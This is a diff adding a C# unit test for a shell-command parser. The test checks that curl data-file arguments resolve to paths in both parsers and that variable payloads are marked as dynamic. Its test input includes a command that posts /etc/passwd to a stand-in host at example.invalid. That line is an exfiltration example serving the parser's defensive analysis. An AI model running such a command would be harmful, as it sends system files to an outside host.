@@ -88,6 +88,31 @@ public class ClauseElementTests
     }
 
     [Fact]
+    public void Curl_data_file_syntax_is_classified_in_both_parsers()
+    {
+        foreach (var (shell, parser) in Parsers())
+        {
+            var fileClause = Assert.Single(
+                parser.Parse("curl -d @/etc/passwd https://example.invalid/api").Clauses);
+            var fileValue = Assert.Single(
+                fileClause.Elements,
+                element => element.Value == "@/etc/passwd");
+            Assert.True(fileValue.IsPath, shell);
+            Assert.NotNull(fileValue.Resolved);
+            Assert.EndsWith("/etc/passwd", fileValue.Resolved, StringComparison.Ordinal);
+
+            var dynamicClause = Assert.Single(
+                parser.Parse("curl --data=@$PAYLOAD https://example.invalid/api").Clauses);
+            var dynamicValue = Assert.Single(
+                dynamicClause.Elements,
+                element => element.Value == "--data=@$PAYLOAD");
+            Assert.Equal(ArgKind.DynamicSkip, dynamicValue.Kind);
+            Assert.False(dynamicValue.IsPath, shell);
+            Assert.Null(dynamicValue.Resolved);
+        }
+    }
+
+    [Fact]
     public void Multiple_git_option_occurrences_remain_distinct()
     {
         foreach (var (_, parser) in Parsers())
